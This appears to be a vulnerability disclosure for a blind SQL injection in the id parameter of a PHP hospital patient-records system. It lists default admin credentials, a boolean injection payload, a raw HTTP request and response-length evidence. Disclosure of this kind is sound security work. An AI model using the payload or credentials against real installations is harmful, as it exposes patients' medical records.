# Hospital's Patient Records Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html

Vulnerability File: /hprms/admin/patients/manage_patient.php?id=

Vulnerability location: /hprms/admin/patients/manage_patient.php?id=, id

Current database name: hprms_db ,length is 8

[+] Payload: /hprms/admin/patients/manage_patient.php?id=1%27%20and%20length(database())%20=8--+ // Leak place ---> id

```sql
GET /hprms/admin/patients/manage_patient.php?id=1%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 7, Content-Length: 4802
![image](https://user-images.githubusercontent.com/54017627/171406322-4631a0bd-db26-455b-b90a-70afad3a0e43.png)

![image](https://user-images.githubusercontent.com/54017627/171406144-aea87509-506a-4ee9-b829-2947fdf94f5f.png)

When length (database ()) = 8, Content-Length: 4906
![image](https://user-images.githubusercontent.com/54017627/171406262-746d89e7-e924-4cb0-9f02-73e57a13b31e.png)

![image](https://user-images.githubusercontent.com/54017627/171406100-27a76b3e-3dfc-418e-be42-991aabb072c0.png)
